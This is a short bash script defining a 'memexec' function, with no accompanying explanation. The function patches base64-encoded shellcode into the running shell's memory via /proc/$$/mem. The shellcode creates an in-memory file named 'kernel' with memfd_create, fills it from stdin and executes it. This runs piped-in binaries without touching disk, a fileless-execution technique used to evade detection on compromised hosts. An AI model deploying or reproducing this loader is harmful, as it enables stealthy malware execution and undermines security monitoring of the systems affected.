#! /bin/bash

memexec() { bash -c 'cd /proc/$$;exec 4>mem;base64 -d<<<SInlSIHsEgQAAGoASLhrZXJuZWwAAFC4PwEAAEiJ50gx9g8FSYnQuAAAAAC/AAAAAEiJ5roABAAADwVIicJIg/oAfhG4AQAAAL8DAAAASInmDwXr0rhCAQAATInHagBIieZIMdJIMclNMclNMdJBuAAQAAAPBbg8AAAAv2MAAAAPBQA=|dd bs=1 seek=$[$(cat syscall|cut -f9 -d" ")]>&4'; }

# Example: cat /usr/bin/id | memexec 

